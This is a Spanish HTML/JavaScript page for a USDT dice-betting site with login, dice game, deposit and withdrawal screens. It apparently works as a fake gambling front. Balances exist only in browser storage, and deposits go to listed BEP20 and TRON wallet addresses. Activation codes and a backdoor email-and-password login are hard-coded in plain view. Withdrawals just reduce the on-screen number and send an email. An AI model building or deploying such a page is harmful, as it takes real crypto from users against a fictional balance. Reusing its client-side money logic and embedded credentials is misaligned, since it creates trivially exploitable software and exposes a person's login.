<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dice Bet Platform con Depósito y Retiro</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#0f0f0f;
  color:#fff;
}

.screen{
  display:none;
  padding:20px;
}

.active{
  display:block;
}

.header{
  display:flex;
  justify-content:space-between;
  align-items:center;
  background:#1a1a1a;
  padding:10px 15px;
  border-bottom:1px solid #333;
}

.balance{
  font-weight:bold;
  display:flex;
  align-items:center;
}

.add-btn{
  background:#2ecc71;
  border:none;
  border-radius:50%;
  width:28px;
  height:28px;
  font-weight:bold;
  cursor:pointer;
  margin-left:10px;
}

.card{
  background:#1c1c1c;
  padding:20px;
  border-radius:12px;
  margin-top:20px;
}

input, select{
  width:100%;
  padding:10px;
  margin:8px 0;
  border:none;
  border-radius:8px;
  text-align:center;
}

button{
  padding:10px;
  border:none;
  border-radius:8px;
  margin:5px 0;
  width:100%;
  font-weight:bold;
  cursor:pointer;
}

.mayor{background:#2ecc71;}
.menor{background:#e74c3c;}
.igual{background:#f1c40f;}

#resultado{
  margin-top:15px;
  text-align:center;
}

.wallet-box{
  background:#111;
  padding:10px;
  border-radius:8px;
  margin-top:10px;
  word-break:break-all;
}

#depositPanel, #codePanel{
  margin-top:15px;
}

/* MODAL WALLET Y RETIRO */
.modal{
  display:none;
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:rgba(0,0,0,0.8);
  justify-content:center;
  align-items:center;
  z-index:100;
}

.modal-content{
  background:#1c1c1c;
  padding:20px;
  border-radius:12px;
  width:90%;
  max-width:400px;
  text-align:center;
}

.modal-content h3{
  margin-top:0;
}

.close-btn{
  background:#e74c3c;
  color:#fff;
  border:none;
  border-radius:8px;
  padding:5px 10px;
  cursor:pointer;
  margin-top:10px;
}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="authScreen" class="screen active">
  <div class="card">
    <h2>🎲 Acceso</h2>
    <input type="text" id="usuario" placeholder="Correo">
    <input type="password" id="password" placeholder="Contraseña">
    <button onclick="registrar()">Registrarse</button>
    <button onclick="login()">Iniciar Sesión</button>
  </div>
</div>

<!-- JUEGO -->
<div id="gameScreen" class="screen">

  <div class="header">
    <div class="balance">
      <span id="saldoHeader">Saldo: 0 USDT</span>
      <button class="add-btn" onclick="abrirWallet()">💰</button>
    </div>
  </div>

  <div class="card">
    <h3>Realizar apuesta</h3>
    <input type="number" id="montoApuesta" placeholder="Monto en USDT">

    <button class="mayor" onclick="jugar('mayor')">Mayor x3.2</button>
    <button class="menor" onclick="jugar('menor')">Menor x3.2</button>
    <button class="igual" onclick="jugar('igual')">Igual x5.2</button>

    <div id="resultado"></div>

    <button onclick="mostrarDeposito()">Depositar</button>
    <button onclick="abrirRetiro()">Retirar fondos</button>
    <button onclick="logout()">Cerrar sesión</button>
  </div>

  <!-- PANEL DE DEPÓSITO -->
  <div id="depositPanel" class="card" style="display:none;">
    <h3>Depósito USDT</h3>
    <input type="number" id="depositAmount" placeholder="Monto a depositar (3-630)" min="3" max="630">
    <input type="text" id="depositHash" placeholder="Hash de transacción">
    <button onclick="validarDeposito()">Validar pago</button>
  </div>

  <!-- PANEL DE CÓDIGO -->
  <div id="codePanel" class="card" style="display:none;">
    <h3>Introduce código de activación</h3>
    <input type="text" id="activationCode" maxlength="4" placeholder="Código 4 dígitos">
    <button onclick="usarCodigo()">Activar depósito</button>
    <div id="codeResult"></div>
  </div>

</div>

<!-- MODAL WALLET -->
<div id="walletModal" class="modal">
  <div class="modal-content">
    <h3>Direcciones USDT</h3>
    <div class="wallet-box"><strong>BEP20:</strong><br>0x3670a0bFfb8b8A6D42177807F8dFd369A3995b9e</div>
    <div class="wallet-box"><strong>TRON:</strong><br>TJvpGB5oUdyFRPg6YrdwLt8SWgNo6GoKwx</div>
    <button class="close-btn" onclick="cerrarWallet()">Cerrar</button>
  </div>
</div>

<!-- MODAL RETIRO -->
<div id="withdrawModal" class="modal">
  <div class="modal-content">
    <h3>Retirar USDT</h3>

    <select id="withdrawNetwork">
      <option value="BEP20">USDT BEP20</option>
      <option value="TRON">USDT TRON</option>
    </select>

    <input type="number" id="withdrawAmount" placeholder="Monto a retirar (mín 7)">
    <input type="text" id="withdrawAddress" placeholder="Dirección destino">

    <button onclick="procesarRetiro()">Confirmar retiro</button>
    <button class="close-btn" onclick="cerrarRetiro()">Cancelar</button>
  </div>
</div>

<script>
// ================= CONFIG =================
const WALLET_BEP20 = "0x3670a0bFfb8b8A6D42177807F8dFd369A3995b9e";
const WALLET_TRON  = "TJvpGB5oUdyFRPg6YrdwLt8SWgNo6GoKwx";

// 30 códigos de activación
let activationCodes = [
  "1001","1002","1003","1004","1005","1006","1007","1008","1009","1010",
  "1011","1012","1013","1014","1015","1016","1017","1018","1019","1020",
  "1021","1022","1023","1024","1025","1026","1027","1028","1029","1030"
];

// ================= STORAGE =================
function obtenerUsuarios(){ return JSON.parse(localStorage.getItem("usuarios")) || {}; }
function guardarUsuarios(data){ localStorage.setItem("usuarios", JSON.stringify(data)); }

// ================= REGISTRO =================
function registrar(){
  let user = usuario.value.trim();
  let pass = password.value.trim();
  if(!user || !pass){ alert("Completa los datos"); return; }
  let usuarios = obtenerUsuarios();
  if(usuarios[user]){ alert("El usuario ya existe"); return; }
  usuarios[user] = { password: pass, saldo: 100, depositos: [] };
  guardarUsuarios(usuarios);
  alert("Registro exitoso");
}

// ================= LOGIN =================
function login(){
  let user = usuario.value.trim();
  let pass = password.value.trim();
  let usuarios = obtenerUsuarios();

  if(user==="alejandromedina135@gmail.com" && pass==="ale1234"){
    if(!usuarios[user]){ usuarios[user] = { password: pass, saldo:120.47, depositos:[] }; guardarUsuarios(usuarios); }
    localStorage.setItem("usuarioActivo", user); cargarJuego(); return;
  }

  if(!usuarios[user] || usuarios[user].password!==pass){ alert("Datos incorrectos"); return; }

  localStorage.setItem("usuarioActivo", user); cargarJuego();
}

// ================= CAMBIO DE PANTALLA =================
function cargarJuego(){
  authScreen.classList.remove("active");
  gameScreen.classList.add("active");
  depositPanel.style.display="none";
  codePanel.style.display="none";
  actualizarSaldo();
}

function logout(){ localStorage.removeItem("usuarioActivo"); location.reload(); }

// ================= SALDO =================
function actualizarSaldo(){
  let usuarios = obtenerUsuarios();
  let activo = localStorage.getItem("usuarioActivo");
  saldoHeader.innerText = "Saldo: "+usuarios[activo].saldo.toFixed(2)+" USDT";
}

// ================= WALLET MODAL =================
function abrirWallet(){ walletModal.style.display="flex"; }
function cerrarWallet(){ walletModal.style.display="none"; }

// ================= DEPÓSITO =================
function mostrarDeposito(){ depositPanel.style.display="block"; }

function validarDeposito(){
  let amount = parseFloat(depositAmount.value);
  let hash   = depositHash.value.trim();
  if(!amount || amount<3 || amount>630){ alert("Monto inválido (3-630 USDT)"); return; }
  if(!hash){ alert("Debes ingresar el hash"); return; }

  let usuarios = obtenerUsuarios();
  let activo = localStorage.getItem("usuarioActivo");
  usuarios[activo].depositos.push({monto:amount, hash:hash, estado:"pendiente"});
  guardarUsuarios(usuarios);

  let body = `Hola, he realizado un depósito en mi cuenta de ${amount} USDT.\nHash: ${hash}\nUSDT BEP20: ${WALLET_BEP20}\nUSDT TRON: ${WALLET_TRON}`;
  window.location.href = `mailto:reffgame.oficial@gmail.com?subject=Depósito USDT&body=${encodeURIComponent(body)}`;

  depositPanel.style.display="none";
  codePanel.style.display="block";
  alert("Se ha enviado el correo. Ingresa el código de activación recibido.");
}

// ================= ACTIVACIÓN =================
function usarCodigo(){
  let code = activationCode.value.trim();
  if(!code){ alert("Ingresa un código"); return; }

  let usedCodes = JSON.parse(localStorage.getItem("usedCodes")) || [];
  if(!activationCodes.includes(code)){ codeResult.innerText="Código inválido"; return; }
  if(usedCodes.includes(code)){ codeResult.innerText="Código ya usado"; return; }

  let usuarios = obtenerUsuarios();
  let activo = localStorage.getItem("usuarioActivo");
  let ultimoDep = usuarios[activo].depositos.reverse().find(d=>d.estado==="pendiente");
  if(!ultimoDep){ codeResult.innerText="No hay depósito pendiente"; return; }

  usuarios[activo].saldo += ultimoDep.monto;
  ultimoDep.estado = "completado";
  guardarUsuarios(usuarios);

  usedCodes.push(code);
  localStorage.setItem("usedCodes", JSON.stringify(usedCodes));

  codeResult.innerText = `Depósito de ${ultimoDep.monto} USDT activado ✅`;
  codePanel.style.display="none";
  actualizarSaldo();
}

// ================= JUEGO =================
function jugar(tipo){
  let monto = parseFloat(montoApuesta.value);
  let usuarios = obtenerUsuarios();
  let activo = localStorage.getItem("usuarioActivo");

  if(!monto || monto<=0){ alert("Monto inválido"); return; }
  if(monto>usuarios[activo].saldo){ alert("Saldo insuficiente"); return; }

  let d1=Math.floor(Math.random()*6)+1;
  let d2=Math.floor(Math.random()*6)+1;
  let gana=false;
  if(tipo==="mayor" && d1>=4 && d2>=4) gana=true;
  if(tipo==="menor" && d1<=3 && d2<=3) gana=true;
  if(tipo==="igual" && d1===d2) gana=true;
  let mult = (tipo==="igual") ? 5.2 : 3.2;
  let msg=`Dados: ${d1} y ${d2}<br>`;
  if(gana){ let ganancia=monto*mult; usuarios[activo].saldo+=ganancia; msg+="🎉 Ganaste "+ganancia.toFixed(2)+" USDT"; }
  else{ usuarios[activo].saldo-=monto; msg+="❌ Perdiste "+monto.toFixed(2)+" USDT"; }
  guardarUsuarios(usuarios);
  actualizarSaldo();
  resultado.innerHTML = msg;
}

// ================= RETIRO =================
function abrirRetiro(){ withdrawModal.style.display="flex"; }
function cerrarRetiro(){ withdrawModal.style.display="none"; }

function procesarRetiro(){
  let network = withdrawNetwork.value;
  let amount = parseFloat(withdrawAmount.value);
  let address = withdrawAddress.value.trim();

  let usuarios = obtenerUsuarios();
  let activo = localStorage.getItem("usuarioActivo");

  if(!amount || amount < 7){
    alert("Monto mínimo de retiro: 7 USDT");
    return;
  }

  if(amount > usuarios[activo].saldo){
    alert("Saldo insuficiente");
    return;
  }

  if(!address){
    alert("Debes ingresar una dirección destino");
    return;
  }

  usuarios[activo].saldo -= amount;
  guardarUsuarios(usuarios);
  actualizarSaldo();

  let body = `Solicitud de retiro:
Usuario: ${activo}
Red: ${network}
Monto: ${amount} USDT
Dirección destino: ${address}`;

  window.location.href = `mailto:reffgame.oficial@gmail.com?subject=Solicitud de Retiro&body=${encodeURIComponent(body)}`;

  alert("Solicitud enviada correctamente.");
  cerrarRetiro();
}

// ================= AUTOLOGIN =================
if(localStorage.getItem("usuarioActivo")){ cargarJuego(); }

</script>

</body>
</html>
